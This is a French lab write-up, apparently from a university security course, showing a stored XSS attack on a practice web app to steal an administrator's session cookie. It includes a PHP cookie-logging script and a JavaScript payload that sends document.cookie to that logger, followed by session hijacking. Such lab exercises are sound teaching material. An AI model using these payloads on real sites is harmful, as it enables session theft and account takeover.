# Vulnérabilité

Cet article illuse une attaque XSS sur le site web vulnérable sti.

Objectif : Voler le cookie de l'administrateur

Méthode : Envoyer un  message contenant un script xss dans le sujet. Celui-ci va faire une requête GET avec la valeur des cookies  renvoyant vers un site web malveillant qui va récupérer le cookie



## Infrastructure

- Fichier `steal.php` pour voler les cookies

```php
<?php
$COOKIE_NAME = "cookie";
if(isset($_GET[$COOKIE_NAME])){
        $cookie = $_GET[$COOKIE_NAME];
        $steal = fopen("log.txt", "a");
        fwrite($steal, $cookie ."\n");
        fclose($steal);
}
?>
```



- Script javascript malveillant

```javascript
<script type="text/javascript">
  document.location = "http://localhost/sti/steal.php?cookie=" + document.cookie ;
</script>
```



## Attaque

- Envoyer le message à notre cible, ici l'utilisateur `admin`

![xss-message](C:\Users\super\switchdrive2\HEIG\s5\sti\pentesting-sti\xss-cookie\xss-message.PNG)

L'utilisateur `admin`losqu'il clique sur sa boite de réception va déclencher l' effet du script malveillant, il sera redirigé vers le site malveillant.

L'attaquant n'a plus qu'a afficher son fichier log.txt pour obtenir le cookie de session

![log-cookie](C:\Users\super\switchdrive2\HEIG\s5\sti\pentesting-sti\xss-cookie\log-cookie.PNG)

## Vérification 

On peut ensuite remplacer notre cookie de session par la valeur de celui récupéré dans les logs.

![change-cookie](C:\Users\super\switchdrive2\HEIG\s5\sti\pentesting-sti\xss-cookie\change-cookie.PNG)

En constate en rafraichissant la page que l'onglet Administration est apparue

![result](C:\Users\super\switchdrive2\HEIG\s5\sti\pentesting-sti\xss-cookie\result.PNG)

## Sources 

https://github.com/kensworth/cookie-stealer

